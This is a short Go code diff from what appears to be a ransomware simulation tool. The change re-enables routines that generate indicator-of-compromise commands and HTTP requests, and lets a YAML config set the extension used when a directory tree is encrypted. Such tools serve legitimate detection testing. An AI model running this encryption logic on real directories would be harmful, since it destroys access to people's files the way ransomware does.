@@ -61,23 +61,24 @@ __________________________________________________
 
     var config cjlib.YAML_CONFIG
     var err error
+    file_ext := *arg_cryptext
     if len(*arg_yaml) > 0 {
         config, err = cjlib.ReadYamlConfig(*arg_yaml)
         if (err != nil) { panic(err) }
+        if len(config.File_extension) > 0 {
+            file_ext = config.File_extension
+        }
     }
     fmt.Printf("\r\n\n[*] =============================================================\n")
-    fmt.Printf("[*]  Creating IOC Activty from [%s]\n", *arg_yaml)
+    fmt.Printf("[*]  Creating IOC Activity from [%s]\n", *arg_yaml)
     fmt.Printf("[*] =============================================================\n")
-    //cjlib.Request_IOC_Commands(config)
-    //cjlib.Request_IOC_HTTP(config)
-
-    fmt.Printf("-> %s\r\n", config.File_extension)
-    panic("exiting...")
+    cjlib.Request_IOC_Commands(config)
+    cjlib.Request_IOC_HTTP(config)
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
 		*arg_directory, aeskey, *arg_exclude,
-		*arg_cryptext, *arg_norename, *arg_dryrun)
+		file_ext, *arg_norename, *arg_dryrun)
 	if err != nil {
 		fmt.Printf("[-] %s\n", err.Error())
         os.Exit(1)
